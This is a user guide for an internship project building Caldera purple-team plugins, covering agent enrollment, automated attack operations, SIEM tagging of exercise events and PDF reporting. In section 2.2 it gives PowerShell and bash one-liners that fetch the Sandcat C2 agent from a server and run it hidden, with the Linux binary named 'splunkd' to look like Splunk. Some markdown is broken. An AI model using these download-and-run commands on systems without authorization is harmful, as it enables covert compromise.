# Purple Team Automation: Internship Project User Guide

**⚠️ EDUCATIONAL PROJECT**: This guide documents an internship learning project, NOT production software.

**Version:** 5.3.0 (Educational)  
**Platform:** Caldera Plugin Development (Internship Project)  
**Author:** Tony To (Intern - Detection Engineer and Automation Officer)  
**Organisation:** Triskele Labs (Internship Programme)  
**Timeline:** January-February 2026  
**Status:** Educational/Portfolio Project

See [INTERNSHIP_DISCLAIMER.md](../INTERNSHIP_DISCLAIMER.md) for complete legal information.

---

## Table of Contents

1. [System Architecture Overview](#1-system-architecture-overview)
2. [Workflow 1: The One-Liner Enrollment](#2-workflow-1-the-one-liner-enrollment)
3. [Workflow 2: Automated Operation Execution](#3-workflow-2-automated-operation-execution)
4. [Workflow 3: Intelligent SIEM Tagging](#4-workflow-3-intelligent-siem-tagging)
5. [Workflow 4: One-Click Branded Reporting](#5-workflow-4-one-click-branded-reporting)
6. [Appendix: Troubleshooting on TL VM](#6-appendix-troubleshooting-on-tl-vm)

---

## 1. System Architecture Overview

### 1.1 The 7-Plugin Learning Architecture

This internship project demonstrates a streamlined plugin architecture. The **7-Plugin Design** explores modular development patterns:

| Plugin | Function | Resource Impact |
|--------|----------|-----------------|
| **Magma** | Vue.js 3 frontend UI | Primary interface |
| **Sandcat** | Cross-platform agent (GoLang) | Lightweight agent deployment |
| **Stockpile** | Adversary profiles & abilities library | Attack playbook repository |
| **Atomic** | Atomic Red Team integration | 796+ pre-built techniques |
| **Orchestrator** | Automated workflow engine | Operation scheduling |
| **Branding** | Custom UI/reporting theming | Visual identity |
| **Reporting** | PDF/HTML report generation | Executive deliverables |

### 1.2 Development Environment Strategy (Learning Exercise)

This project explores operating within resource constraints as a learning exercise:

The platform is designed to operate within constrained environments:

```Memory Allocation (Development Environment)     │
├─────────────────────────────────────────────────────────┤
│  Caldera Core Server      │  ~1.5 GB                    │
│  Plugin Overhead          │  ~0.5 GB                    │
│  Active Operations        │  ~1.0 GB (variable)         │
│  System Reserve           │  ~1.0 GB                    │
│  ELK Stack (External)     │  Separate VM (learning)     │
├─────────────────────────────────────────────────────────┤
│  Available Headroom       │  ~3.7 GB                    │
└─────────────────────────────────────────────────────────┘
```

**Learning Techniques Demonstrated**:

**Key Optimization Techniques:**
- Disabled non-essential plugins (training, emu, access)
- Asynchronous operation processing via `aiohttp`
- Lazy-loading of ability definitions
- External SIEM integration (no local log storage)

---Agent Deployment Learning Exercise

### 2.1 Overview

This demonstrates simplified agent deployment patterns explored during the internship. The one-liner approach eliminates complex deployment procedures

The One-Liner Enrollment feature eliminates the need for RDP access during agent deployment. Security teams can deploy agents across client environments using a single command.

### 2.2 Step-by-Step: Agent Enrollm (Development Environment)

Navigate to **Campaigns → Agents** in the interface.

```
http://localhost:8888/agents  (Development server)
```
http://localhost:8888/agents
```

#### Step 2: Click "Deploy Agent"

Select the **"Click to Deploy"** button to open the deployment modal.

#### Step 3: Select Platform & Configuration

| Parameter | Windows | Linux/macOS |
|-----------|---------|-------------|
| Platform | `windows` | `linux` / `darwin` |
| Agent | `sandcat` | `sandcat` |
| Contact | `HTTP` | `HTTP` |
| Server | `http://<SERVER_IP>:8888` | `http://<SERVER_IP>:8888` |

#### Step 4: Copy the One-Liner

**PowerShell (Windows):**
```powershell
$server="http://192.168.1.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go-windows");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
Get-Process | ? {$_.Path -like "*$name*"} | Stop-Process -Force -ErrorAction SilentlyContinue;
rm -force "C:\Users\Public\$name" -ErrorAction SilentlyContinue;
[io.file]::WriteAllBytes("C:\Users\Public\$name",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name -ArgumentList "-server $server -group red" -WindowStyle Hidden;
```

**Bash (Linux/macOS):**
```bash
server="http://192.168.1.100:8888";
curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

#### Step 5: Execute on Target

Deploy via:
- **Remote PowerShell** (WinRM)
- **SSH Session**
- **RMM Tool** (ConnectWise, Datto, NinjaRMM)
- **GPO Startup Script**

### 2.3 Zero-RDP Advantage

| Traditional Method | Triskele One-Liner |
|--------------------|-------------------|
| RDP to each machine | Execute remotely via RMM/SSH |
| 15-20 min per host | < 30 seconds per host |
| Screen recording required | Command-line audit trail |
| Interactive session | Non-interactive execution |

---

## 3. Workflow 2: Automated Operation Execution

### 3.1 Overview

The Orchestrator plugin enables **Consolidated Workflows** that automate attack sequences. Target: **30+ automated attacks per 4-hour session**.

### 3.2 Creating an Operation

#### Step 1: Navigate to Operations

```
http://localhost:8888/operations
```

#### Step 2: Click "Create Operation"

Configure the operation:

| Field | Recommended Value |
|-------|-------------------|
| Name | `PURPLE-<CLIENT>-<DATE>` |
| Adversary | Select pre-built profile |
| Planner | `atomic` (sequential) or `batch` |
| Fact Source | `basic` or client-specific |
| Auto-close | `Enabled` |
| Obfuscator | `plain-text` (for visibility) |

#### Step 3: Select Adversary Profile

Pre-configured adversary profiles in Stockpile:

```yaml
# Example: Discovery-focused adversary
name: Network Discovery
description: MITRE ATT&CK Discovery techniques
atomic_ordering:
  - T1016    # System Network Configuration Discovery
  - T1049    # System Network Connections Discovery  
  - T1082    # System Information Discovery
  - T1083    # File and Directory Discovery
  - T1087    # Account Discovery
  - T1135    # Network Share Discovery
```

#### Step 4: Start Operation

Click **"Start"** to begin automated execution.

### 3.3 Orchestrator Consolidated Workflow

The Orchestrator triggers operations programmatically:

```python
# orchestrator/hook.py - Simplified workflow
async def execute_consolidated_workflow(services):
    """
    Automated purple team workflow:
    1. Verify agent enrollment
    2. Execute operation
    3. Tag SIEM events
    4. Generate report
    """
    # Get active agents
    agents = await services.get('data_svc').locate('agents')
    
    # Create operation
    operation = await services.get('rest_svc').create_operation(
        name=f"AUTO-{datetime.now().strftime('%Y%m%d-%H%M')}",
        adversary_id="<adversary-uuid>",
        planner="atomic",
        group="red"
    )
    
    # Start execution
    await services.get('rest_svc').update_operation(
        operation.id, 
        state="running"
    )
```

### 3.4 API-Driven Operation Control

```bash
# Start operation via REST API
curl -X PATCH http://localhost:8888/api/v2/operations/<OP_ID> \
  -H "Content-Type: application/json" \
  -d '{"state": "running"}'

# Check operation status
curl http://localhost:8888/api/v2/operations/<OP_ID>

# List all abilities executed
curl http://localhost:8888/api/v2/operations/<OP_ID>/links
```

---

## 4. Workflow 3: Intelligent SIEM Tagging

### 4.1 Overview

The **Intelligent SIEM Tagging** feature eliminates manual alert closure by automatically tagging simulated attack logs with `purple_team_exercise=true`.

### 4.2 The `post_operation_start` Hook

When an operation begins, the Orchestrator triggers SIEM notification:

```python
# orchestrator/hook.py
from plugins.orchestrator.app.siem_connector import SIEMConnector

class OrchestatorService:
    
    async def post_operation_start(self, operation):
        """
        Hook: Called when operation state changes to 'running'
        """
        siem = SIEMConnector(
            host=os.getenv('ELK_HOST', 'localhost'),
            port=os.getenv('ELK_PORT', 9200)
        )
        
        # Tag time window in SIEM
        await siem.create_exercise_window(
            start_time=operation.start,
            operation_id=operation.id,
            source_ips=self._get_agent_ips(operation),
            tag="purple_team_exercise=true"
        )
```

### 4.3 ELK Integration Configuration

Set environment variables before starting the server:

```bash
export ELK_HOST="192.168.1.50"
export ELK_PORT="9200"
export ELK_INDEX="purple-team-*"
export ELK_API_KEY="your-api-key-here"

python3 server.py --insecure
```

### 4.4 SIEM Tag Structure

```json
{
  "@timestamp": "2026-01-08T14:30:00.000Z",
  "event.category": "intrusion_detection",
  "event.kind": "alert",
  "triskele.purple_team_exercise": true,
  "triskele.operation_id": "abc123-def456",
  "triskele.operation_name": "PURPLE-ACME-20260108",
  "triskele.auto_close": true,
  "source.ip": "192.168.1.25",
  "destination.ip": "192.168.1.100"
}
```

### 4.5 SOC Analyst Workflow

| Before (Manual) | After (Automated) |
|-----------------|-------------------|
| Alert fires in SIEM | Alert fires with tag |
| Analyst investigates | Filter: `purple_team_exercise=true` |
| Cross-reference with PT schedule | Auto-acknowledged |
| Manually close alert | Bulk auto-close |
| **Time: 5-10 min/alert** | **Time: 0 min/alert** |

---

## 5. Workflow 4: One-Click Branded Reporting

### 5.1 Overview

Generate executive-ready PDF reports with Triskele Labs branding using the **Cyber-Celtic** design system.

### 5.2 Step-by-Step: Report Generation

#### Step 1: Complete an Operation

Ensure operation state is `finished`:

```bash
curl http://localhost:8888/api/v2/operations/<OP_ID> | jq '.state'
# Output: "finished"
```

#### Step 2: Navigate to Reporting

```
http://localhost:8888/operations
```

Select the completed operation and click **"Generate Report"**.

#### Step 3: Select Report Format

| Format | Use Case |
|--------|----------|
| PDF | Executive presentation |
| JSON | Data integration |
| HTML | Web embedding |

#### Step 4: Configure Branding

The Branding plugin automatically applies:

- **Header:** Triskele Labs logo (SVG)
- **Color Scheme:** Triskele Green (#10B981) accents
- **Footer:** Copyright & website
- **Watermark:** "CONFIDENTIAL - CLIENT NAME"

### 5.3 Report API Endpoint

```bash
# Generate PDF report
curl -X POST http://localhost:8888/api/v2/reports \
  -H "Content-Type: application/json" \
  -d '{
    "operation_id": "<OP_ID>",
    "format": "pdf",
    "include_facts": true,
    "include_screenshots": false
  }' \
  --output "PURPLE_TEAM_REPORT.pdf"
```

### 5.4 Cyber-Celtic Design System

```
┌────────────────────────────────────────────────────────────┐
│  ⟨ ⟩  TRISKELE LABS                                       │
│       Purple Team Assessment Report                        │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Client: ACME Corporation                                  │
│  Date: January 8, 2026                                     │
│  Classification: CONFIDENTIAL                              │
│                                                            │
├────────────────────────────────────────────────────────────┤
│  EXECUTIVE SUMMARY                                         │
│  ══════════════════                                        │
│  Techniques Executed: 34                                   │
│  Successful: 31 (91%)                                      │
│  Blocked: 3 (9%)                                           │
│                                                            │
│  [████████████████████░░] 91% Success Rate                │
│                                                            │
├────────────────────────────────────────────────────────────┤
│  © 2026 Triskele Labs | https://triskelelabs.com          │
└────────────────────────────────────────────────────────────┘
```

---

## 6. Appendix: Troubleshooting on TL VM

### 6.1 Check Available RAM

```bash
free -m
```

**Expected Output:**
```
              total        used        free      shared  buff/cache   available
Mem:           7700        3200        1500         200        3000        4000
Swap:          2048         100        1948
```

**Warning Thresholds:**
- Available < 1GB: Reduce concurrent operations
- Available < 500MB: Stop operations, restart server

### 6.2 Verify Server Status

```bash
# Check if server is running
lsof -ti:8888

# Test API connectivity
curl -s http://localhost:8888/api/v2/health | jq

# Expected response
{
  "status": "healthy",
  "version": "5.3.0",
  "plugins": ["magma", "sandcat", "stockpile", "atomic", "orchestrator", "branding", "reporting"]
}
```

### 6.3 Verify ELK Connectivity

```python
# Python check script: check_elk.py
import os
import requests

elk_host = os.getenv('ELK_HOST', 'localhost')
elk_port = os.getenv('ELK_PORT', '9200')

try:
    response = requests.get(f"http://{elk_host}:{elk_port}/_cluster/health", timeout=5)
    if response.status_code == 200:
        print(f"✓ ELK Connected: {elk_host}:{elk_port}")
        print(f"  Cluster Status: {response.json()['status']}")
    else:
        print(f"✗ ELK Error: HTTP {response.status_code}")
except Exception as e:
    print(f"✗ ELK Unreachable: {e}")
```

Run check:
```bash
python3 check_elk.py
```

### 6.4 Common Issues & Solutions

| Symptom | Cause | Solution |
|---------|-------|----------|
| UI shows "Loading..." indefinitely | Vue router auth loop | Clear browser cache, re-login |
| Agent not appearing | Firewall blocking 8888 | Open port or use tunnel |
| Operation stuck at 0% | No matching abilities for platform | Verify agent platform matches ability requirements |
| PDF report empty | Operation has no executed links | Ensure operation ran to completion |
| High memory usage | Too many concurrent operations | Limit to 2-3 simultaneous operations |

### 6.5 Server Restart Procedure

```bash
# 1. Stop existing server
lsof -ti:8888 | xargs kill -9

# 2. Clear operation cache (optional)
rm -rf data/results/*

# 3. Restart server
cd /path/to/Internship_C
python3 server.py --insecure

# 4. Verify startup
curl http://localhost:8888/api/v2/health
```

### 6.6 Emergency Contacts

| Issue Type | Contact |
|------------|---------|
| Platform Bugs | GitHub Issues: `triskele-labs/command-center` |
| Security Incidents | security@triskelelabs.com |
| Licensing | sales@triskelelabs.com |

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | Jan 2026 | Triskele Labs | Initial release |

---

**© 2026 Triskele Labs. All rights reserved.**

*This document is CONFIDENTIAL and intended for authorized personnel only.*
